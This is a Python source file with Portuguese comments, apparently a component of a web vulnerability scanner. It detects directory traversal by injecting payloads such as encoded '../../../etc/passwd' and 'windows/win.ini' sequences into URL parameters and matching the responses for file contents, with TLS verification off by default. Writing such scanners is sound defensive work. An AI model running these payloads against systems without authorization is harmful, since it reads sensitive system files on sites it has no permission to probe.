"""
Scanner de Directory Traversal — Vlad Volkov
Detecta vulnerabilidades de Path Traversal / Directory Traversal.
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Payloads de traversal
PAYLOADS_TRAVERSAL = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc/passwd",
    "../../../windows/win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

# Indicadores de traversal bem-sucedido
INDICADORES = [
    r"root:.*:0:0:",
    r"\[boot loader\]",
    r"\[fonts\]",
    r"# /etc/fstab",
]


class ScannerTraversal:
    """Detecta vulnerabilidades de Directory Traversal."""

    def __init__(self, timeout: int = 10, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao(self, url: str) -> Optional[object]:
        try:
            return self.sessao.get(url, timeout=self.timeout, verify=self.verificar_ssl)
        except Exception:
            return None

    def _url_com_param(self, url: str, param: str, valor: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [valor]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _detectar(self, resposta) -> Optional[str]:
        if resposta is None:
            return None
        for indicador in INDICADORES:
            if re.search(indicador, resposta.text, re.IGNORECASE):
                return indicador
        return None

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa scan de traversal."""
        self.vulnerabilidades = []

        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando Directory Traversal em: {url[:60]}")

        for param in params:
            for payload in PAYLOADS_TRAVERSAL:
                url_teste = self._url_com_param(url, param, payload)
                resp = self._requisicao(url_teste)
                indicador = self._detectar(resp)

                if indicador:
                    self.vulnerabilidades.append({
                        "tipo": "Directory Traversal",
                        "parametro": f"{param} (GET)",
                        "payload": payload,
                        "indicador": indicador,
                        "severidade": "critico",
                    })
                    break

                time.sleep(0.1)

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ Traversal encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum Directory Traversal detectado[/dim]")

        return self.vulnerabilidades
